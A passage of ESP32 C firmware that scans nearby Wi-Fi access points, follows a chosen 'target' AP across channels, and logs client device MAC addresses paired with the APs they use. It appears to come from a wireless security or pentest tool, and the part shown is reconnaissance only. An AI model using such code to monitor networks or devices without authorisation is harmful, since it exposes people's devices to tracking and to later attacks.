    if(out == NULL) return ESP_ERR_INVALID_ARG;

    if (xSemaphoreTake(aps_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        memcpy(out, &detected_aps, sizeof(aps_info_t));
        xSemaphoreGive(aps_semaphore);
        return ESP_OK;
    }
    return ESP_FAIL;
}


static void beacon_track_task(void *param)
{
    uint8_t new_channel = 0;
    esp_err_t err = ESP_OK;
    while (1)
    {
        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);

        if (xSemaphoreTake(target_semaphore, pdMS_TO_TICKS(100)) == pdTRUE)
        {
            if (target == NULL)
            {
                xSemaphoreGive(target_semaphore);
                xTimerReset(beacon_track_timer_handle, 0);
                continue;
            }

            new_channel = getNextChannel(target->channel);
            err = wifi_set_channel_safe(new_channel);
            if (err == ESP_OK)
            {
                target->channel = new_channel;
                ESP_LOGI(TAG, "Hopping to channel %d", target->channel);
            }
            xSemaphoreGive(target_semaphore);
        }
        xTimerReset(beacon_track_timer_handle, 0);
    }
}


static void hopping_timer_callback(TimerHandle_t xTimer)
{
    BaseType_t xHigherPriorityTaskWoken = pdFALSE;
    vTaskNotifyGiveFromISR(beacon_track_task_handle, &xHigherPriorityTaskWoken);
    if (xHigherPriorityTaskWoken)
    {
        portYIELD_FROM_ISR();
    }
}


static void wifi_sniffer_single_channel_hopping_task(void *param)
{
    uint8_t channel = (uint8_t)(uintptr_t)param;
    wifi_scan_config_t cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .scan_type = WIFI_SCAN_TYPE_PASSIVE,
        .show_hidden = false,
        .channel = channel,
        //.scan_time.active.min = 0,
        //.scan_time.active.max = 120,
        .scan_time.passive = 90,      // dwell per channel (ms)
        .home_chan_dwell_time = 220,
    };

    while(true) 
    {
        xEventGroupClearBits(scan_evt, SCAN_DONE_BIT);
        if (esp_wifi_scan_start(&cfg, false) != ESP_OK) { 
            vTaskDelay(pdMS_TO_TICKS(150)); 
            continue; 
        }
        xEventGroupWaitBits(scan_evt, SCAN_DONE_BIT, pdTRUE, pdFALSE, pdMS_TO_TICKS(600));
        vTaskDelay(pdMS_TO_TICKS(5));
    }
}


static void wifi_sniffer_channel_hopping_task(void *param)
{
    while(true)
    {
        /* Do a scan instead of changing channel to keep AP connection */
        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = false,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 60,
            .scan_time.active.max = 200,
            .home_chan_dwell_time = 150,
        };
        esp_err_t err = esp_wifi_scan_start(&scan_config, true);
        
        if (err == ESP_OK) 
        {
            uint16_t ap_count = 0;
            esp_wifi_scan_get_ap_num(&ap_count);

            if (ap_count > 0) 
            {
                wifi_ap_record_t *ap_records = (wifi_ap_record_t *)calloc(ap_count, sizeof(wifi_ap_record_t));
                if (ap_records) 
                {
                    err = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
                    if (err == ESP_OK) 
                    {
                        if (xSemaphoreTake(aps_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
                        {
                            for (int i = 0; i < ap_count; i++) 
                            {
                                if (ap_records[i].rssi < -92) continue; 
                                bool found = false;
                                for (int k = 0; k < detected_aps.count; k++) 
                                {
                                    if (memcmp(detected_aps.ap[k].bssid, ap_records[i].bssid, 6) == 0) 
                                    {
                                        memcpy(&detected_aps.ap[k], &ap_records[i], sizeof(wifi_ap_record_t));
                                        found = true;
                                        break;
                                    }
                                }
                                if (!found && detected_aps.count < MAX_AP) 
                                {
                                    memcpy(&detected_aps.ap[detected_aps.count], &ap_records[i], sizeof(wifi_ap_record_t));
                                    detected_aps.count++;
                                }
                            }
                            xSemaphoreGive(aps_semaphore);
                        }
                    }
                    free(ap_records);
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(5000));
    }
}


static void add_client_to_list(const uint8_t *mac, const uint8_t *bssid)
{
    // Filter null MAC or Broadcast/Multicast
    if (mac == NULL || (mac[0] & 0x01) == 1) {
        return;
    }

    if (bssid == NULL || isMacBroadcast(bssid)) {
        return;
    }

    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) == pdTRUE)
    {
        /* Dont add duplicates */
        for (uint8_t i = 0; i < clients.count; i++) {
            if (memcmp(clients.client[i].mac, mac, 6) == 0) {
                memcpy(clients.client[i].bssid, bssid, 6);
                xSemaphoreGive(clients_semaphore);
                return;
            }
        }
        if (clients.count < MAX_CLIENTS) {
            memcpy(clients.client[clients.count].mac, mac, 6);
            memcpy(clients.client[clients.count].bssid, bssid, 6);
            clients.count++;
            ws_log(TAG, "New Client: %02X:%02X:%02X:%02X:%02X:%02X Linked to AP: %02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            ESP_LOGI(TAG, "New Client: %02X:%02X:%02X:%02X:%02X:%02X Linked to AP: %02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        }
        xSemaphoreGive(clients_semaphore);
    }
}